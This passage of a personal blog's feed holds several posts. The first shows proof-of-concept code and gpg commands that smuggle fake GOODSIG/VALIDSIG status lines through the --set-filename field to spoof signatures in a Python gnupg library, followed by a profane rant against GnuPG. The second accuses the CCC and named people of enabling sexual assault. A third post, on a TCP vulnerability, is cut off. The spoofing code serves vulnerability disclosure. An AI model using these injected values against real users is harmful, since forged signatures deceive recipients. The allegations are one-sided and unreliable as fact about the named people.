    5YaF6XbFYO8ceruOmnzYYEQTBRmlrBbnaug/cDa5Yq4HIWDHRTR9/aK4Y9rcYsoK
    Jm+7ujLey3TsI9qMs3cbcmsZbnXm+v3uDLvGBofG/dAjqVvm074=
    =UN+a
    -----END PGP MESSAGE-----
    '''

    result1 = gpg.verify(poc1msg)
    print("[poc1] Was the spoofed signature valid? %r" % result1.valid)

    poc2msg = '''\
    -----BEGIN PGP MESSAGE-----

    y8BvYv8nCltHTlVQRzpdIEdPT0RTSUcgRjJBRDg1QUMxRTQyQjM2OCBQYXRyaWNr
    IEJydW5zY2h3aWcgPHBhdHJpY2tAZW5pZ21haWwubmV0PgpbR05VUEc6XSBWQUxJ
    RFNJRyBGMkFEODVBQzFFNDJCMzY4IHggMTUyNzcyMTAzNyAwIDQgMCAxIDEwIDAx
    CltHTlVQRzpdIFRSVVNUX0ZVTExZCltHTlVQRzpdIEJFR0lOX0RFQ1JZUFRJT04K
    W0dOVVBHOl0gREVDUllQVElPTl9PS0FZCltHTlVQRzpdIEVOQ19UTyBBM0FEQjY3
    QTJDREI4QjM1IDEgMApncGc6ICdbIaFeU2VlIHlvdSBhdCB0aGUgc2VjcmV0IHNw
    b3QgdG9tb3Jyb3cgMTBhbS4K
    =Qs3t
    -----END PGP MESSAGE-----
    '''

    result2 = gpg.decrypt(poc2msg)
    print("[poc2] Was the spoofed signature and encryption valid? %r"
          % result2.valid)

    poc3msg = '''\
    -----BEGIN PGP MESSAGE-----

    owJ42m2PsWrDMBiE9zzF1Uu2YDmJZYcQasV2oLRLHegQOij4txC1rGBZQ1+lT9M9
    79O5gkAppceNd8d318/H85dxaj5TF7VBo9UgJz8SjGwJR09gCR78gCRmGWK2CU7W
    KJ6wr5rjrfRH3ulB4bkp8EbvYDFfVnxViWUmyrRk+Yqne1FnVZGXos5rwVNWpJz/
    O6Wd8zQiOuu+v6euW9hRRbfkwdoW7ge3G61B9BJyWhoI3waGyQ7Y/q7uIpw63/ev
    mIfLp7vrhyGaYAhyCqDSzL4B9fBP7w==
    =zQV0
    -----END PGP MESSAGE-----
    '''

    result3 = gpg.verify(poc3msg)
    print("[poc3] Was the spoofed signature valid? %r" % result3.valid)
&lt;/pre&gt;

&lt;p&gt;The GnuPG blobs were generated with (via Markus Brinkmann&amp;#8217;s&amp;nbsp;suggestions):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;##&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PoC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;#1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Please send me one of those expensive washing machines.&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;armor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;a3adb67a2cdb8b35&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;encrypt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;`echo -ne \&amp;#39;&amp;#39;\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] GOODSIG DB1187B9DD5F693B Patrick Brunschwig &amp;lt;patrick@enigmail.net&amp;gt;\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] VALIDSIG 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B 2018-05-31 1527721037 0 4 0 1 10 01 4F9F89F5505AC1D1A260631CDB1187B9DD5F693B\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] TRUST_FULLY 0 classic\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg: &amp;#39;\&amp;#39;`&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;poc1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;

&lt;span class="err"&gt;##&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PoC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;#2&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;See you at the secret spot tomorrow 10am.&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;armor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="nf"&gt;compress&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;level&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;`echo -ne \&amp;#39;&amp;#39;\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] GOODSIG F2AD85AC1E42B368 Patrick Brunschwig &amp;lt;patrick@enigmail.net&amp;gt;\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] VALIDSIG F2AD85AC1E42B368 x 1527721037 0 4 0 1 10 01\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] TRUST_FULLY\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] BEGIN_DECRYPTION\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] DECRYPTION_OKAY\&lt;/span&gt;
&lt;span class="ss"&gt;\n[GNUPG:] ENC_TO 50749F1E1C02AB32 1 0\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg: &amp;#39;\&amp;#39;`&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;poc2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;

&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PoC&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;#3&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;meet me at 10am&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;gpg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;armor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;`echo -ne msg\&amp;#39;&amp;#39;\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg: Signature made Tue 12 Jun 2018 01:01:25 AM CEST\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg:                using RSA key 1073E74EB38BD6D19476CBF8EA9DBF9FB761A677\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg:                issuer &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;bill&lt;/span&gt;&lt;span class="nv"&gt;@eff&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;\&lt;/span&gt;
&lt;span class="ss"&gt;\ngpg: Good signature from &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;William&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Budington&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;bill&lt;/span&gt;&lt;span class="nv"&gt;@eff&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="ss"&gt;&amp;quot; [full]&lt;/span&gt;
&lt;span class="ss"&gt;&amp;#39;\&amp;#39;&amp;#39;msg&amp;#39;`&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;poc3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Again, not vulnerable, for all the reasons described&amp;nbsp;above.&lt;/p&gt;
&lt;p&gt;Additionally, if Vinay would have actually understood and fixed the root cause
of the original shell injection vulnerability six years ago, his library
likely wouldn&amp;#8217;t be vulnerable, yet again, today.  But of course, the GnuPG
community, just like upstream,
&lt;a href="https://twitter.com/isislovecruft/status/811502983615840256"&gt;really only takes patches from men&lt;/a&gt;,
so it&amp;#8217;s neither my problem nor concern that they seem to continually discover
new and innovative ways to fuck themselves and their users&amp;nbsp;over.&lt;/p&gt;
&lt;h1&gt;Please&amp;nbsp;don&amp;#8217;t&lt;/h1&gt;
&lt;p&gt;If you&amp;#8217;re a developer thinking of making a new tool or product based on the
OpenPGP protocol: please don&amp;#8217;t.  Literally use anything else.  I wrote my
version of python-gnupg because, at the time, the project I worked on wanted to
make transparently encrypting remailers, i.e. middleware boxes run by an email
service provider which users register their encryption keys with, which
would—upon seeing a plaintext email to another of the provider&amp;#8217;s
users—automatically encrypt the email to the user.  We used GnuPG for this.
This was a mistake, in my opinion, and if I had to do the project again, I would
do it entirely&amp;nbsp;differently.&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re a developer thinking you can write a less shitty version of GnuPG:
please don&amp;#8217;t.  &lt;span class="caps"&gt;RFC4880&lt;/span&gt; was a mistake and needs to die in a fire.  Also nobody
under thirty actually uses email for anything other than signing up for&amp;nbsp;services.&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re a user or potential user of GnuPG: please don&amp;#8217;t.  Try using tools with
safer, constant-time cryptographic implementations, better code, nicer and more
inclusive development teams, and a better overall user experience, like
&lt;a href="https://signal.org/"&gt;Signal&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;If you&amp;#8217;re considering getting into GnuPG development: please don&amp;#8217;t.  Especially
if you&amp;#8217;re non-cis-male identified, it&amp;#8217;s going to be a complete and infuriating
waste of your time and talents.  Please consider donating your skills to more
inclusive projects with fewer moronic&amp;nbsp;assholes.&lt;/p&gt;
&lt;h1&gt;Moving&amp;nbsp;forward&lt;/h1&gt;
&lt;p&gt;There isn&amp;#8217;t really any path forward.  GnuPG and its underlying libgcrypt remain
some of the worst C code I&amp;#8217;ve ever read.  The code isn&amp;#8217;t constant time, and
numerous attacks have resulted from this, as the developers scurry to jump
through hoops of fire to implement yet another variable-timed algorithm they&amp;#8217;ve
seemingly come up with on the spot which is vulnerable to a dozen more attacks
&lt;em&gt;just not that one from the latest paper&lt;/em&gt;. OpenPGP (&lt;span class="caps"&gt;RFC4480&lt;/span&gt;) is one of the worst
designs and specifications ever written.  I have to spend spots, here and there,
of my non-existent free time maintaining a whitelist as the GnuPG developers
randomly change their internal, nearly undocumented line protocol, between micro
versions.  I&amp;#8217;d like to not do this.  Please, let&amp;#8217;s stop pretending this crock of
shit provides anything at all &amp;#8220;pretty good&amp;#8221;: not the cryptographic algorithms,
not the code, not the user experience, and certainly not the goddamned &lt;span class="caps"&gt;IPC&lt;/span&gt;&amp;nbsp;design.&lt;/p&gt;
&lt;p&gt;There is one way forward: Vinay is annoyed that my library has a similar name,
because &lt;em&gt;god forbid a user get tricked into using something more secure&lt;/em&gt;.
Frankly, I&amp;#8217;m sick of Vinay&amp;#8217;s trash code being mistaken for mine, and
increasingly so, the more vulnerabilities surface in it.  So I&amp;#8217;ve decided to
rename the thing formerly installable with &lt;code&gt;pip install gnupg&lt;/code&gt; to &lt;code&gt;pip install
pretty_bad_protocol&lt;/code&gt; (name thanks to &lt;a href="https://twitter.com/withoutboats"&gt;boats&lt;/a&gt;&amp;#8216;
&lt;a href="https://github.com/withoutboats/pbp"&gt;pbp rust crate&lt;/a&gt;).  If you grep for
&lt;code&gt;pretty_bad_protocol&lt;/code&gt; in a python library which uses gnupg and there&amp;#8217;s no
results, you&amp;#8217;ll know someone&amp;#8217;s not being very honest about what gnupg has to&amp;nbsp;offer.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;¹ I don&amp;#8217;t speak for my current or past employers or&amp;nbsp;clients.&lt;/p&gt;</content><category term="hacking"></category><category term="security"></category></entry><entry><title>The CCC: Men Who Hate Women</title><link href="https://blog.patternsinthevoid.net/the-ccc-men-who-hate-women.html" rel="alternate"></link><published>2017-12-26T20:00:00+00:00</published><updated>2018-07-06T20:24:13+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2017-12-26:/the-ccc-men-who-hate-women.html</id><summary type="html">

&lt;p style="font-size: small;"&gt;
Content Warning: rape, sexual assault, whistleblower&amp;nbsp;retaliation
&lt;/p&gt;

&lt;p&gt;Sarah Jeong&amp;#8217;s recent article,
&lt;a href=https://www.theverge.com/2017/12/21/16807116/infosec-community-sexual-predators-weinstein-assault&gt;&lt;i&gt;Vulnerabilities and exploits: what happened when the infosec community outed its own sexual predators&lt;/i&gt;&lt;/a&gt;,
discusses some positive cultural changes in North America since the outings of
serial rapists Jacob Appelbaum and Morgan&amp;nbsp;Marquis-Boire.&lt;/p&gt;
&lt;p&gt;This post is not about those positive changes.  This post is about people and
organisations which haven&amp;#8217;t changed, such as the Chaos Computer Club (&lt;span class="caps"&gt;CCC&lt;/span&gt;), who
have attempted to save face in public, while privately working to undermine
positive change and enable&amp;nbsp;rapists.&lt;/p&gt;


&lt;p&gt;In June 2016,
&lt;a href="https://blog.patternsinthevoid.net/the-forest-for-the-trees.html"&gt;I&lt;/a&gt; and
&lt;a href="http://jacobappelbaum.net"&gt;others&lt;/a&gt; spoke up about serial rapist and abuser,
Jacob Appelbaum.  Unlike other organisations — such as The Tor Project, or The
Cult of the Dead Cow — the &lt;span class="caps"&gt;CCC&lt;/span&gt; delayed for more than a month in responding.
Eventually, their hand was forced by
&lt;a href="https://twitter.com/chaosupdales/status/743197667157762048"&gt;a parody &amp;#8220;@chaosupdales&amp;#8221; Twitter account&lt;/a&gt;
announcing that the &lt;span class="caps"&gt;CCC&lt;/span&gt; had expelled Jake.  First,
the &lt;span class="caps"&gt;CCC&lt;/span&gt; clarified that they had not expelled Jake.  Then, the &lt;span class="caps"&gt;CCC&lt;/span&gt; posted a vague
statement that &amp;#8220;all are welcome&amp;#8221;.  Finally, the &lt;span class="caps"&gt;CCC&lt;/span&gt; claimed that their statement
had, &amp;#8220;of course&amp;#8221;, referred to Jake all along.  Of course, they only clarified
this on Twitter and never updated their statement. In English, this is called&amp;nbsp;&amp;#8220;gaslighting&amp;#8221;.&lt;/p&gt;
&lt;p&gt;There were no Tor talks last year at 33C3, because every Tor talk submitted was
silently removed by the &lt;span class="caps"&gt;CCC&lt;/span&gt; to &amp;#8220;avoid controversy&amp;#8221;.  Before the congress, the
&lt;span class="caps"&gt;CCC&lt;/span&gt; requested a meeting with their selection of representatives from Tor to
discuss a way forward.  I requested to attend the meeting, and was forbidden
from attending by the &lt;span class="caps"&gt;CCC&lt;/span&gt; organisers, who said that the meeting would not occur
if I were present.
Two other members of the Tor community were expelled for their participation in
&lt;a href="http://jacobappelbaum.net/#stories"&gt;River&amp;#8217;s brutal assault&lt;/a&gt;.
The &lt;span class="caps"&gt;CCC&lt;/span&gt; continued their pattern of feigning interest in making progress, while
privately showing no interest in learning about what had happened from the&amp;nbsp;survivors.&lt;/p&gt;
&lt;p&gt;One of those expelled was
7a573b399812f3260385bd1790cd3e22612fad1b02ad8d95946bd096f1c8455d (hereafter
truncated to &amp;#8220;7a573b39&amp;#8221;), the second
participant in River&amp;#8217;s account, which describes a horrific assault while she was
intoxicated to the point of being non-responsive.  Unlike my coworkers, 7a573b39 was
given a talk at 33C3.  (Ironically, on a project I helped design and implement.)
This was the &lt;span class="caps"&gt;CCC&lt;/span&gt;&amp;#8217;s idea of the way&amp;nbsp;forward.&lt;/p&gt;
&lt;p&gt;Survivors of Jacob&amp;#8217;s abuse had collectively agreed to give 7a573b39 a second
chance: he said he had been manipulated by Jake into participating in the rape;
he did not appear to have committed any similar abuse; he expressed remorse and
apologised to River; he claimed to have taken a class on not only recognising,
but enacting bystander intervention in sexual&amp;nbsp;harassment.&lt;/p&gt;
&lt;p&gt;Here is 7a573b39 nine months later, in September 2017, standing next to&amp;nbsp;Jake:&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span id="wrapper" style="width:100%;"&gt;
&lt;table id="wrapper-table" style="width:100%; padding:0.2em;"&gt;&lt;tbody&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding:0.2em;"&gt;
    &lt;a href="./static/images/2017/12/ascrypto2017.JPG"&gt;
    &lt;img alt="7a573b39 and Jake" width="100%"
         src="./static/images/2017/12/ascrypto2017.JPG" /&gt;
    &lt;/a&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;This photo was taken in Cuba at ASCrypto, a self-described school for &amp;#8220;graduate
students in cryptography&amp;#8221; aiming to &amp;#8220;build cryptologic research capacity in the
region&amp;#8221;.  7a573b39 explained to others within the Tor Project that he hadn&amp;#8217;t
intended to run into Jake, and that Jake had &amp;#8220;followed&amp;#8221; him around &amp;#8220;harassing …&lt;/p&gt;&lt;/span&gt;</summary><content type="html">

&lt;p style="font-size: small;"&gt;
Content Warning: rape, sexual assault, whistleblower&amp;nbsp;retaliation
&lt;/p&gt;

&lt;p&gt;Sarah Jeong&amp;#8217;s recent article,
&lt;a href=https://www.theverge.com/2017/12/21/16807116/infosec-community-sexual-predators-weinstein-assault&gt;&lt;i&gt;Vulnerabilities and exploits: what happened when the infosec community outed its own sexual predators&lt;/i&gt;&lt;/a&gt;,
discusses some positive cultural changes in North America since the outings of
serial rapists Jacob Appelbaum and Morgan&amp;nbsp;Marquis-Boire.&lt;/p&gt;
&lt;p&gt;This post is not about those positive changes.  This post is about people and
organisations which haven&amp;#8217;t changed, such as the Chaos Computer Club (&lt;span class="caps"&gt;CCC&lt;/span&gt;), who
have attempted to save face in public, while privately working to undermine
positive change and enable&amp;nbsp;rapists.&lt;/p&gt;


&lt;p&gt;In June 2016,
&lt;a href="https://blog.patternsinthevoid.net/the-forest-for-the-trees.html"&gt;I&lt;/a&gt; and
&lt;a href="http://jacobappelbaum.net"&gt;others&lt;/a&gt; spoke up about serial rapist and abuser,
Jacob Appelbaum.  Unlike other organisations — such as The Tor Project, or The
Cult of the Dead Cow — the &lt;span class="caps"&gt;CCC&lt;/span&gt; delayed for more than a month in responding.
Eventually, their hand was forced by
&lt;a href="https://twitter.com/chaosupdales/status/743197667157762048"&gt;a parody &amp;#8220;@chaosupdales&amp;#8221; Twitter account&lt;/a&gt;
announcing that the &lt;span class="caps"&gt;CCC&lt;/span&gt; had expelled Jake.  First,
the &lt;span class="caps"&gt;CCC&lt;/span&gt; clarified that they had not expelled Jake.  Then, the &lt;span class="caps"&gt;CCC&lt;/span&gt; posted a vague
statement that &amp;#8220;all are welcome&amp;#8221;.  Finally, the &lt;span class="caps"&gt;CCC&lt;/span&gt; claimed that their statement
had, &amp;#8220;of course&amp;#8221;, referred to Jake all along.  Of course, they only clarified
this on Twitter and never updated their statement. In English, this is called&amp;nbsp;&amp;#8220;gaslighting&amp;#8221;.&lt;/p&gt;
&lt;p&gt;There were no Tor talks last year at 33C3, because every Tor talk submitted was
silently removed by the &lt;span class="caps"&gt;CCC&lt;/span&gt; to &amp;#8220;avoid controversy&amp;#8221;.  Before the congress, the
&lt;span class="caps"&gt;CCC&lt;/span&gt; requested a meeting with their selection of representatives from Tor to
discuss a way forward.  I requested to attend the meeting, and was forbidden
from attending by the &lt;span class="caps"&gt;CCC&lt;/span&gt; organisers, who said that the meeting would not occur
if I were present.
Two other members of the Tor community were expelled for their participation in
&lt;a href="http://jacobappelbaum.net/#stories"&gt;River&amp;#8217;s brutal assault&lt;/a&gt;.
The &lt;span class="caps"&gt;CCC&lt;/span&gt; continued their pattern of feigning interest in making progress, while
privately showing no interest in learning about what had happened from the&amp;nbsp;survivors.&lt;/p&gt;
&lt;p&gt;One of those expelled was
7a573b399812f3260385bd1790cd3e22612fad1b02ad8d95946bd096f1c8455d (hereafter
truncated to &amp;#8220;7a573b39&amp;#8221;), the second
participant in River&amp;#8217;s account, which describes a horrific assault while she was
intoxicated to the point of being non-responsive.  Unlike my coworkers, 7a573b39 was
given a talk at 33C3.  (Ironically, on a project I helped design and implement.)
This was the &lt;span class="caps"&gt;CCC&lt;/span&gt;&amp;#8217;s idea of the way&amp;nbsp;forward.&lt;/p&gt;
&lt;p&gt;Survivors of Jacob&amp;#8217;s abuse had collectively agreed to give 7a573b39 a second
chance: he said he had been manipulated by Jake into participating in the rape;
he did not appear to have committed any similar abuse; he expressed remorse and
apologised to River; he claimed to have taken a class on not only recognising,
but enacting bystander intervention in sexual&amp;nbsp;harassment.&lt;/p&gt;
&lt;p&gt;Here is 7a573b39 nine months later, in September 2017, standing next to&amp;nbsp;Jake:&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span id="wrapper" style="width:100%;"&gt;
&lt;table id="wrapper-table" style="width:100%; padding:0.2em;"&gt;&lt;tbody&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding:0.2em;"&gt;
    &lt;a href="./static/images/2017/12/ascrypto2017.JPG"&gt;
    &lt;img alt="7a573b39 and Jake" width="100%"
         src="./static/images/2017/12/ascrypto2017.JPG" /&gt;
    &lt;/a&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;This photo was taken in Cuba at ASCrypto, a self-described school for &amp;#8220;graduate
students in cryptography&amp;#8221; aiming to &amp;#8220;build cryptologic research capacity in the
region&amp;#8221;.  7a573b39 explained to others within the Tor Project that he hadn&amp;#8217;t
intended to run into Jake, and that Jake had &amp;#8220;followed&amp;#8221; him around &amp;#8220;harassing
him&amp;#8221; the whole&amp;nbsp;time.&lt;/p&gt;
&lt;p&gt;7a573b39 is not a student of cryptography, so it seems pretty implausible that he&amp;#8217;d
fly all the way to Cuba for a cryptography school with lectures given by Jacob&amp;#8217;s
advisers and enablers,
&lt;a href="https://medium.com/@hdevalence/when-hell-kept-on-payroll-somewhere-is-where-you-are-f419d3022d0"&gt;Dan Bernstein and Tanja Lange&lt;/a&gt;,
and then be shocked (&lt;em&gt;shocked!&lt;/em&gt;) to discover Jacob there.  But even if this
story were true, standing idly by your fellow abuser is not the action of
someone who feels genuine remorse or&amp;nbsp;regret.&lt;/p&gt;
&lt;p&gt;This appears to be the same pattern of behaviour as the &lt;span class="caps"&gt;CCC&lt;/span&gt;: in
public, do the bare minimum to feign progress; in private, do whatever
they think they can get away&amp;nbsp;with.&lt;/p&gt;
&lt;p&gt;This year, for 34C3, the &lt;span class="caps"&gt;CCC&lt;/span&gt; rejected talks discussing harassment and abuse, yet
they found time to give 7a573b39 &lt;em&gt;two&lt;/em&gt; talks.  They shut down
conversations on paths towards progress, safety, and inclusivity, but they allow
&lt;a href="https://pbs.twimg.com/media/DRQupEeXUAAI_T7.jpg"&gt;an assembly&lt;/a&gt; which proclaims
&amp;#8220;a code-of-conduct free zone&amp;#8221;, warning attendees to &amp;#8220;enter at own risk&amp;#8221;.  It is never enough to just
work against abusers.  The rot stems from within a larger system, and it
is vital to fight, root and branch, against the organisations, structures, and
people which enable sexual assault, harassment, and other forms of
discrimination.  The &lt;span class="caps"&gt;CCC&lt;/span&gt;&amp;#8217;s actions have been entirely within bad faith, meant to
cause and enable further harm.  I do not say this lightly: the &lt;span class="caps"&gt;CCC&lt;/span&gt; hates&amp;nbsp;women.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;Edit (2017-12-27 18:00): After additional conversations with River, we have
agreed to edit this post in the following&amp;nbsp;ways:&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;First, it is important to clarify that River describes Jacob Appelbaum&amp;#8217;s actions
as rape, and the other participant&amp;#8217;s actions as sexual assault.  Further, we
would like to make clear the differences between the two: Jacob has never
attempted any apology to any of his survivors (and instead has proceeded to
threaten and direct further abuses at them), while the other participant, as
described above, has taken every step asked of him in an accountability process,
only to afterwards betray survivors.  There are degrees to violence and
sexualised violence, and, within context, the actions of one abuser should not
necessarily be categorised as equivalent to another.  (The author, isis agora
lovecruft, takes full responsibility for the mistakes in the original word
choices and would like to point out the importance of having
&lt;a href="https://crimethinc.com/2013/04/17/accounting-for-ourselves-breaking-the-impasse-around-assault-and-abuse-in-anarchist-scenes"&gt;survivor-led processes and noting the ways in which accountability may fail&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Second, we have chosen to redact the other participant&amp;#8217;s name.  While it is one
thing to speak in our own words of his successes and failures in healing
alongside with survivors, it is our fear that others will use his name with
words that are not ours — that is, not survivor-led — in ways that might damage
his capabilities for further healing and remediation.  It is our hope to work
with him to combat the ongoing damages of our patriarchal society, our systems
entrenched with and built around (trans)misogyny, and to build entirely new
systems and spaces for community interaction which prevent what we have survived
from occuring in the&amp;nbsp;future.&lt;/p&gt;</content><category term="hacking"></category><category term="ccc"></category></entry><entry><title>CVE-2016-5696 and its effects on Tor</title><link href="https://blog.patternsinthevoid.net/cve-2016-5696-and-its-effects-on-tor.html" rel="alternate"></link><published>2016-08-11T15:29:00+00:00</published><updated>2016-08-12T20:55:00+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2016-08-11:/cve-2016-5696-and-its-effects-on-tor.html</id><summary type="html">

&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; This vulnerability is quite serious, but it doesn&amp;#8217;t affect
  the Tor network any more than it affects the rest of the internet.
  In particular, the Tor-specific attacks mentioned in the paper will
  not work as&amp;nbsp;described.&lt;/p&gt;
&lt;p&gt;Recently,
&lt;a href="http://www.cs.ucr.edu/~zhiyunq/pub/sec16_TCP_pure_offpath.pdf"&gt;an excellent paper&lt;/a&gt;,
entitled &lt;em&gt;&amp;#8220;Off-Path &lt;span class="caps"&gt;TCP&lt;/span&gt; Exploits: Global Rate Limit Considered
Dangerous,&amp;#8221;&lt;/em&gt; was published by Yue Cao, Zhiyun Qian, Zhongjie Wang, Tuan
Dao, Srikanth V. Krishnamurthy, and Lisa M. Marvel at &lt;a href="https://www.usenix.org/conference/usenixsecurity16"&gt;&lt;span class="caps"&gt;USENIX&lt;/span&gt; Security
2016&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The paper describes
